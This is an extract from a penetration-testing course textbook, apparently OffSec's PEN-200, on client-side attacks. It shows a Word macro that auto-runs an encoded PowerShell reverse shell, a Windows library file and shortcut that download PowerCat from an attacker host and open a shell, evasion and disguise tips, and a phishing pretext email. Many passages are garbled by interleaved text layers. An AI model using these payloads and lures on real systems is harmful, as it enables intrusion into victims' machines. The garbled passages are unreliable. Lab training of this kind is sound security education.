+str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+for i in range(0, len(str), n):
+       print("Str = Str + " + '"' + str[i:i+n] + '"')
+                          Listing 253 - Python script to split a base64 encoded PowerShell command string
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                382
+                                                                                               Penetration Testing with Kali Linux
+
+Having split the base64-encoded string into smaller chunks, we can update our macro:
+
+Sub AutoOpen()
+       MyMacro
+
+End Sub
+
+Sub Document_Open()
+       MyMacro
+
+End Sub
+
+Sub MyMacro()
+       Dim Str As String
+
+<cr>Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+       Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+       Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+
+...
+       Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+       Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+       Str = Str + "A== "</cr>
+
+       CreateObject("Wscript.Shell").Run Str
+End Sub
+
+                                     Listing 254 - Macro invoking PowerShell to create a reverse shell
+
+After we modify our macro, we can save and close the document. Before re-opening it, let's start
+a Python3 web server in the directory where the PowerCat script is located. We'll also start a
+Netcat listener on port 4444.
+
+asAegftcaeuirnridtifyotuhwbealenrn-acimnlicgekrionefggtahtrhedeidnodgcotuchmuemeEnentnactb,hlteahnCegoemnsta.ecnrtobiusttaoWuhntiotismlonawotitcaalplypeeaxreincugteadg.aiNno. tIet  that the               macro
+                                                                                                                                                                                     will only              appear
+
+After the macro is executed, we  srehceellivineoauGr ENJTeeftrfceraqetuyleissttefnoerrt.he  PowerCat  script  in  our                                                                                       Python3  web
+server and an incoming reverse
+
+ClWk<coaiispnlrdit>yr@ecoonkiwsnagilnnhPgite:oc(~otwCn$e)rt<[SohaMcn[uieylc1>r9ln]oc2s4.-1o4n64fvt84l.p.1Co1.4.9r4.pO4o2S4r]-<a5/tf77cir5uoo2>nm1.9(0UANlKlNrOWiNgh)ts[1r9e2.se1r6v8e.d5.0.196] 49768</cr>
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+<cr>PS C:\Users\offsec\Documents></cr>
+                                                  Listing 255 - Reverse shell from Word macro
+
+Opening the document ran the macro and sent us a reverse shell. Excellent!
+
+Let's briefly summarize what we did in this section. First, we created a VBA macro in a Word
+document to execute a single command when the document is opened. Then, we replaced the
+single command with a base64-encoded PowerShell command downloading PowerCat and
+starting a reverse shell on the local system.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                             383
+                                                                                                                                                                                          Penetration Testing with Kali Linux
+
+Microsoft Office documents containing malicious macros are still a great client-side attack vector
+to obtain an initial foothold in an enterprise network. However, with the growing awareness of
+users to not open Office documents from emails and the rising number of security technologies
+in place, it becomes increasingly more difficult to get a macro delivered and executed. Therefore,
+we'll discuss another client-side attack in the next Learning Unit, which we can use as an
+alternative or even as a delivery method for malicious Office documents.
+
+12.3 Abusing Windows library files
+
+This Learning Unit covers the following Learning Objectives:
+· Prepare an attack with Windows library files
+· Leverage Windows shortcuts to obtain code execution
+
+Many security products scan for malicious macros. Microsoft also provides guides and Group
+Policy Object (GPO) templates to mitigate and reduce this threat. In addition, most social
+engineering awareness training programs focus on preventing this vector. These factors make
+this a difficult vector to successfully execute.
+
+      Info
+     If we need a quick refresher on Group Policy Objects, we can review the Microsoft
+     documentation.
+
+In this Learning Unit, we'll explore Windows library files, which are a lesser-known threat but
+equally effective.
+
+12.3.1   libraryOfbiletas ianreinvgirtcuaoldceonetaxineecrus tfioornusveiracWohWinttilenondwt.oTwhesy                                                                                  library  files  with  data  stored
+                     dliokeubwlee-bcliscekrivnigcetsheomr sinhaJWreefinsfd.roeTywhessEexfpilleosrehr.ave
+Windows                                                                                                                                                                                connect  users
+
+in remote locations                                                                                                                                                                    a  .Library-ms  file  extension  and
+can be executed by
+
+dIlsinbtoarutaghbreiyls,e-fswcielleeiccs'ltlkioteuonds,.gewatienh'lelaleffovooeotrthahogoledldatOootSnw-p5torh7o-7esv5tita2da1ger9eg0aecntliesenyxste-tsceiumdteaabanltedtafcsilkee.t  In the first stage, we'll use Windows
+                                                                                                                                                                                       up the second stage. In the second
+                                                                                                                                                                                       that will start a reverse shell when
+
+First, we'll create a Windows library file connecting to a WebDAV share we'll set up. In the first
+stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it
+will appear as a regular directory in Windows Explorer. In the WebDAV directory, we'll provide a
+payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse
+shell. We must convince the user to double-click our .lnk payload file to execute it.
+
+At first glance, it may seem that we could accomplish this by serving the .lnk file for the second
+stage with a web server like Apache. The disadvantage is that we would need to provide our web
+link to the victim (again, perhaps by email). Most spam filters and security technologies analyze
+the contents of a link for suspicious content or executable file types to download. This means
+that our links may be filtered before even reaching the victim.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                384
+                                                                          Penetration Testing with Kali Linux
+
+On the other hand, many spam filters and security technologies will pass Windows library files
+directly to the user. When they double-click the file, Windows Explorer displays the contents of the
+remote location as if it were a local directory. In this case, the remote location is a WebDAV share
+on our attack machine. Overall, this is a relatively straightforward process and makes it seem as if
+the user is double-clicking a local file.
+
+To demonstrate this, we'll first set up a WebDAV share on our Kali system. We'll use WsgiDAV as
+the WebDAV server to host and serve our files. We can install WsgiDAV using apt.
+
+kali@kali:~$ <cu>sudo apt install python3-wsgidav</cu>
+Reading package lists... Done
+...
+Setting up python3-wsgidav ...
+
+                                                          Listing 256 - Installing WsgiDAV
+
+Once WsgiDAV is installed, we'll create the /home/kali/webdav directory to use as the WebDAV
+share that will contain our .lnk file. For now, let's place a test.txt file in this directory.
+
+Next, let's start WsgiDAV. The first parameter we'll provide is --host, which specifies the host to
+serve from. We'll listen on all interfaces with 0.0.0.0. Next, we'll specify the listening port with --
+port=80 and disable authentication to our share with --auth=anonymous. Finally, we'll set the root
+of the directory of our WebDAV share with --root /home/kali/webdav/.
+
+kali@kali:~$ <cu>mkdir /home/kali/webdav</cu>
+
+kali@kali:~$ <cu>touch /home/kali/webdav/test.txt</cu>
+
+k1R/uh7anol:mi4n@1iekn:/k5aga3l.wli:ii9~1t/7$whoe-<ubdctWauAcv>R/owNsn<Ig/fNiciGudgua>:vraAt-pi-pohnowssftgi=il0de.a.0v..0m.w0.c-o-rpso.rCto=Wr8his0t(lN-oo-wnaeu)t.hi=sa_ndoinsyamboluesd(-)-rroeotturned True:
+skipping.
+17:41:53.919 - INFO  :    WsgiDAV/4.0.1  JPeyftfhroeLny/oc3.k9Ma.1na0gLeirn(uLxoc-k5S.t1o5r.a0g-ekDailcit3)-amd64-x86_64-
+with-glibc2.33       :    Lock manager:
+17:41:53.919 - INFO
+1'111777/7:::u:444s4111r1/::::5l5553i333..b../99991111p999y9t----hoIIIInNNNN3FFFF/OOOOdist-::::paPDRcreokgmo-aOaipgSies'e-trn/s5te:/77yrcdw5eois2ndmrg1ta_i9nDrbd0aAoraVglovelw/presd:rrei:orrv'_NiS:bidornemFopreiwsllseeeDbsroyy/mshrattoiedunmoCtPcoersn:o'tvri(odRleelraedrf-(oO)rnlpya)th(anonymous)
+17:41:53.919 - INFO : - '/': FilesystemProvider for path '/home/kali/webdav'
+
+(Read-Write) (anonymous)
+
+17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to
+
+enable SSL.
+
+17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
+
+17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+
+17:41:54.348 - INFO : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
+
+<cr>17:41:54.348 - INFO : Serving on http://0.0.0.0:80 ..</cr>
+
+                          Listing 257 - Starting WsgiDAV on port 80
+
+The output indicates that the WebDAV server is now running on port 80. Let's confirm this by
+opening http://127.0.0.1 in our browser.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                   385
+                                                                          Penetration Testing with Kali Linux
+
+                                                     Figure 202: Contents of WebDAV share
+
+Figure 202 shows that we could successfully browse to the WebDAV share and view test.txt.
+
+Next, let's create the Windows library file. We'll use xfreerdp to connect to the CLIENT137
+machine at 192.168.50.194 via RDP to prepare our attack. We can connect to the system with
+offsec as the username and lab as the password. This will make it a lot easier for us to build and
+test our library file, and later, our shortcut file.
+
+Once connected, we'll find the Visual Studio Code (VSC) application on the desktop, which we'll
+use to create our library file. We should note that we could also use Notepad to create the file.
+Let's open VSC by double-clicking the icon.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57F7i5g2ur1e92003: Windows 11 Desktop
+
+In the menu bar, we'll click on File > New Text File. We'll then save the empty file as config.Library-
+ms on the offsec user's desktop. As soon as we save the file with this file extension, it is displayed
+with an icon. While the icon doesn't look dangerous, it is not commonly used by Windows and
+therefore may raise suspicions. To increase the chances that our victim will execute our file, let's
+change its appearance.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  386
+                                                                          Penetration Testing with Kali Linux
+
+                                                     Figure 204: Empty Windows Library file
+
+Library files consist of three major parts and are written in XML to specify the parameters for
+accessing remote locations. The parts are General library information, Library properties, and
+Library locations. Let's build the XML code by adding and explaining the tags. We can refer to the
+Library Description Schema for further information. We'll begin by adding the XML and library file's
+format version.
+
+The listing below contains the namespace for the library file. This is the namespace for the
+version of the library file format starting from Windows 7. The listing also contains the closing tag
+<<lf<iob/?lrrixlamibrtbrlyhraDeavrereysyrDlicbDesriseripacosrtcrniyor=ip"indpt1ti.teao0isgno"csnr.ixe>pmntlciononsd.=i"nAhgl=tl "tpUo:Tf/F/-ths8c"eh?e>fmoJalelsof.wfmriiencygroWtshaiogtfslto.wcwoem/wcionvdeorwsw/i2ll00b9e/liabdrdaerdy">inside the
+nNoefeexthdt,iswtoleib'lslraparedycd.ifWtyweothmteaugnssat pmnrooetviocLdifosiOntnSitgn-fhgu5eins7257eflo85ibt2r-hmr1Xai9Msra0yLtwioabinntydhaLpabibrnoroauvraytirdDtbhieintesrgcalriirbpaytriaonDnrayLVm.LeTreshnioewanmenaecmaanentdjaugsitnsdspeeextc.irfaWiensedothcmealnyn.auWmseee
+@shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. We'll
+use the latter to avoid any issues with text-based filters that may flag on "shell32". The version tag
+can be set to a numerical value of our choice, for example, 6.
+
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+
+                                              Listing 259 - Name and Version Tags of the Library
+
+Next, we'll add the isLibraryPinned tag. This element specifies if the library is pinned to the
+navigation pane in Windows Explorer. For our targets, this may be another small detail to make
+the whole process feel more genuine and therefore, we'll set it to true. The next tag we'll add is
+iconReference, which determines what icon is used to display the library file. We must specify the
+value in the same format as the name element. We can use imagesres.dll to choose between all
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  387
+                                                                          Penetration Testing with Kali Linux
+
+Windows icons. We can use index "-1002" for the Documents folder icon from the user home
+directories or "-1003" for the Pictures folder icon. We'll provide the latter to make it look more
+benign.
+
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+
+                                      Listing 260 - Configuration for Navigation Bar Pinning and Icon
+
+Now, let's add the templateInfo tags, which contain the folderType tags. These tags determine the
+columns and details that appear in Windows Explorer by default after opening the library. We'll
+need to specify a GUID that we can look up on the Microsoft documentation webpage. For this
+example, we'll use the Documents GUID to appear as convincing as possible for the victim.
+
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+
+                                                 Listing 261 - templateInfo and folderType tags
+
+The next tag marks the beginning of the library locations section. In this section, we specify the
+storage location where our library file should point to. We'll begin by creating the
+searchConnectorDescriptionList, tag which contains a list of search connectors defined by
+searchConnectorDescription. Search connectors are used by library files to specify the connection
+settings to a remote location. We can specify one or more searchConnectorDescription elements
+inside the searchConnectorDescriptionList tags. For this example, we only specify one.
+
+Inside the description of the search connector, we'll specify information and parameters for our
+
+WebDAV share. The first tag we'll add is the isDefaultSaveLocation tag with the value set to true.
+
+This tag  dndeoefttaeduromltciunbmeesheantvhtieeodrbieanhntadhveilooMrcaoictfriooWnsi,onfwdtoeDw'lolscsuEemtxpeitlnotWtroahetirittowrlnuohwewe.neNbaepuxatsg,eewr, acenh'lldoaoisdsdeusstehtode  save an item. To
+use the                                                                                                                                                                                          isSupported tag,
+which is                                                                                                                                                                                         for compatibility.
+
+oTWl<<<ossivhceeeseeaaaDrctrermHiaofccnTonhahuCCsTsiooltnePtnnti.amnnSiIteeatmptvcciosotteoroLorcfteroroaaDDclnnueaesttsstsaeetccii.arnorr-gefinirdp>piiestttwniirudoouitrnnelhly,<L>Oinwwi/Ssi-thatsh5iy>D7ce7ehas5fsi2wamt1uhe9ple0tlneSneLJaoeeovrdfcmefaLtratooeiolcyplnaootctiianaogttnisot>,onwPohruoicrvhipdrweereveiocleaumnsleyunscte.retoatsepdeWcifeybtDhAeVresmhaortee
+
+<isSupported>false</isSupported>
+
+<simpleLocation>
+
+<cr><url>http://192.168.119.2</url></cr>
+
+</simpleLocation>
+
+</searchConnectorDescription>
+
+</searchConnectorDescriptionList>
+
+                   Listing 262 - searchConnectorDescriptionList and simpleLocation tags
+
+Let's paste the code into Visual Studio Code.
+
+We have just reviewed the XML code for all the sections of our library file. We now have a basic
+understanding of the inner workings of library files and can customize them to fit our needs. The
+following listing shows the entire XML:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                         388
+                                                                                                                              Penetration Testing with Kali Linux
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.2</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+                                Listing 263 - Windows Library code for connecting to our WebDAV Share
+
+Let's save and close the file in Visual Studio Code. We'll then double-click the config.Library-ms
+file on the Desktop.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                             Figure 205: Double-Clicking the Windows Library file
+
+When we open the directory in Explorer, we find the previously created test.txt file we placed in
+the WebDAV share. Therefore, the library file works and embeds the connection to the WebDAV
+share.
+
+Very nice!
+
+As a bonus, the path in the navigation bar only shows config without any indication that this is
+actually a remote location. This makes it a perfect first stage for our client-side attack.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  389
+                                                                                                                              Penetration Testing with Kali Linux
+
+When we re-open our file in Visual Studio Code, we find that a new tag appeared named serialized.
+The tag contains base64-encoded information about the location of the url tag. Additionally, the
+content inside the url tags has changed from http://192.168.119.2 to
+\\192.168.119.2\DavWWWRoot. Windows tries to optimize the WebDAV connection information
+for the Windows WebDAV client and therefore modifies it.
+
+                                             Figure 206: Modified XML code of config.Library-ms
+
+iTTNssaststheihtsshootairsuasewoitaaeraereevlsltitiigv.iobzbshoeieiymranndradtayprewrwlyatuntashisnetmfgtsetinail,hrneeitweinaegtwgvse,omtewteuhiionlaearelnetycowxlawcylenroioaoeecnonrnrnuekrtktyteteesi-benasndisegwdittdssthywWhheueoteeeoOoaifnWnsSrvtkl-sdtiiwiwasi5cenon7tctnhdwegii7knmdeo5sgdonwf2taolnht12ipsoibu9el6esor0bld3afir,tblifhoerblJoieryenue-earcrfttbfmcrooliyfiallmceeriuonVfk,-eaicsuglwiyescelirit.uethc,WvhWH'aikhlinbilclsioieutntnSthwisatemldteteuoeodot.dwdvafwurieicletoeasrok,f,CotEttcowehnoxrriepcdestaaheleocit.e.serarOUeennetrsnnhonrtcfsecetaoheosrarsottedth.uwhbteoTneisdtgrhahtfaitcediisenlnueelffyctaioelh,ofelrmiwaumlsetslepiod.natrTnctyiertiheeeostWueesniornduegnrilbniottmegoDadiinotnAldhtsaiVooasetl
+to start a reverse shell by putting the .lnk shortcut file on the WebDAV share for the victim to
+execute.
+
+Let's create the shortcut on the desktop for the offsec user. For this, we'll right-click on the
+desktop and click on New then on Shortcut. In the Create Shortcut window, we can enter a path to
+a program along with arguments, which will be pointed to by the shortcut. We'll point the shortcut
+to PowerShell and use another download cradle to load PowerCat from our Kali machine and
+start a reverse shell.
+
+We'll use the command we leveraged previously:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  390
+                                                                                                                              Penetration Testing with Kali Linux
+
+powershell.exe -c "IEX(New-Object
+System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell"
+
+                          Listing 264 - PowerShell Download Cradle and PowerCat Reverse Shell Execution
+
+We'll enter this command into the input field and click Next.
+
+                         Figure 207: Creating a Shortcut on CLIENT137
+
+If we expect  that  our  avichtaimndsyatrreictke.cShin-scaevovuyrepnrooWuvhgiidhteltdoowccohmecmkawnhdelroeotkhsevsehryorstcuuspt ifcilieosuas,re
+pointing, we  can   use
+
+cswhoeomcrtmocuualtdn, dtjuhoseutytpwouoft utahldedeovlniismliybitsleeeraeartenhadeibnbeetnnhiieggnnfJielcecfoo'fsmrmpemmyroaapnneddrt.byemhienndui.tItfoapuussehr  the malicious  the
+                                                                                                                                                                    were to check
+
+IFOninntihosehurntoKexactlriewmaitnaedctohhwine,efl,iellete'.st'sesnttaerrtaOauS-Pto5y7mt7h5ao2tni1c39_0cwoenbfisgeurrvaetiroonnapsotrhte80n0am0 we hfoerrethpeoswheorrctactu.pt sfi1leisanlodccaltiecdk
+
+and start a Netcat listener on port 4444.
+
+Instead of using a Python3 web server to serve Powercat, we could also host it on the
+WebDAV share. However, as our WebDAV share is writable, AV and other security
+solutions could remove or quarantine our payload. If we configure the WebDAV share as
+read-only, we'd lose a great method of transferring files from target systems.
+Throughout this course, we'll use a Python3 web server to serve our payload for attacks
+utilizing Windows Library files.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                391
+                                                                                                                                   Penetration Testing with Kali Linux
+
+To confirm that the download cradle and the PowerCat reverse shell works, let's double-click the
+shortcut file on the desktop. After confirming that we want to run the application in the appearing
+window, the Netcat listener should receive a reverse shell.
+
+kali@kali:~$ <cu>nc -nvlp 4444</cu>
+listening on [any] 4444 ...
+<cr>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768</cr>
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+<cr>PS C:\Windows\System32\WindowsPowerShell\v1.0></cr>
+                                  Listing 265 - Successful reverse shell connection via our Shortcut file
+
+To conclude this section, let's obtain a reverse shell from the HR137 machine at 192.168.50.195.
+For this example, we'll provide the Windows library file we created to a simulated victim with a
+pretext. Our goal is to convince the victim to double-click the shortcut after embedding the
+WebDAV share via the prepared Windows library file.
+
+The pretext is an important aspect of this client-side attack. In this case we could tell the target
+that we are a new member of the IT team, and we need to configure all client systems for the new
+management platform. We'll also tell them that we've included a user-friendly configuration
+program. An example email for use in a real assessment is shown below.
+
+Hello! My name is Dwight, and I'm a new member of the IT Team.
+
+dpcTTIooehfinrirmysfefcooairutkrweeommehrtyteakh,vhaecIiehasacandosmneytnadefsciipoqo.uuemgprubel,Clsreaeto-tuitIilo'icnnvodlgseni,ycasiokuoonttmr"daetarohcuewhcutonneowndlmfoiianainatdtdgiouofcitrw_JaahlcetneetofhyinftaaofrttnhpierstagyoataupbcwrWhwpleahieimettemlarilnosroot,slnwa,l,"upe?yldotpeooOmuoean'snauctreteitelchlyaeaeaolsltulltmyedwoeneke!.
+oNknuoorwwK!, alelit'ms acochpiynea.uFtoomr caotinc_vceonniOefSnig-c5ueL7ri,s7atw5tini2oeg1n92c.06lan6nk-
+                                                                                                           Example email content   to    our  WebDAV                                                                                                                                                                                                              directory   on
+                                                                                                                                   file  to   copy the                                                                                                                                                                                                            files into  the
+                                                                                                           and config.Library-ms
+                                                                                                           use the config library
+
+directory. In a normal assessment we would most likely send the library file via email but for this
+
+example, we'll use the \\192.168.50.195\share SMB share to simulate the delivery step.
+
+Next, we'll start the Python3 web server on port 8000 to serve powercat.ps1, WsgiDAV for our
+WebDAV share /home/kali/webdav, and a Netcat listener on port 4444.
+
+To upload the library file to the SMB share, we'll use smbclient with the -c parameter to specify
+the put config.Library-ms command. Before we execute smbclient, we need to change our
+current directory to the library file's directory. We'll also delete the previously created test.txt file
+from the WebDAV share.
+
+kali@kali:~$ <cu>cd webdav</cu>
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                      392
+                                                                                                Penetration Testing with Kali Linux
+
+kali@kali:~/webdav$ <cu>rm test.txt</cu>
+
+kali@kali:~/webdav$ <cu>smbclient //192.168.50.195/share -c 'put config.Library-
+ms'</cu>
+Enter WORKGROUP\kali's password:
+<cr>putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8
+kb/s)</cr>
+
+                           Listing 267 - Uploading our Library file to the SMB share on the HR137 machine
+
+After we put the library file on the target's machine via smbclient, a simulated user on the system
+opens it and starts the reverse shell by executing the shortcut file.
+
+kali@kali:~$ <cu>nc -nvlp 4444</cu>
+listening on [any] 4444 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> <cu>whoami</cu>
+whoami
+<cr>hr137\hsmith</cr>
+
+                                               Listing 268 - Incoming reverse shell from HR137
+
+Listing 268 shows that we successfully received a reverse shell with our Library and shortcut
+files.
+
+Excellent.  also  have  combined  this  technique  with  oWuhriptrleovwious           Office    macro  attack,  or  any  other
+We could
+
+type of client-side attacks.  about     WindowJsefLfriberyary             files  and  how       to  weaponize   them  as  an
+In this section, we learned
+
+sawehfsafoesyrcptttcaoivumedt efffiiillrlitevseetrtrsos.toadugorewstneolcodoaendldivPesortawagOneeSre-Cp5xaa7et7yc5lauo2nta1add9b0ssletwafriilttehaoinuretcvleieexnrpstoe-ssisidnhegealtl.thtWeamcinksdto.oAwssescsLueircbiotryanrdtyescftihlaengsoela,owrgeieeasusgseruedcahat
+
+12.4 Wrapping up
+
+Client-side attack vectors are often an effective way of getting an initial foothold in a non-routable
+internal network. They are especially insidious as they exploit weaknesses or leverage
+functionality of existing client software.
+
+In this Module, we learned how to get information about our targets to prepare client-side attacks.
+We then leveraged Microsoft Office macros, Windows library files, and shortcut files to obtain
+code execution and receive reverse shells.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                  393
+
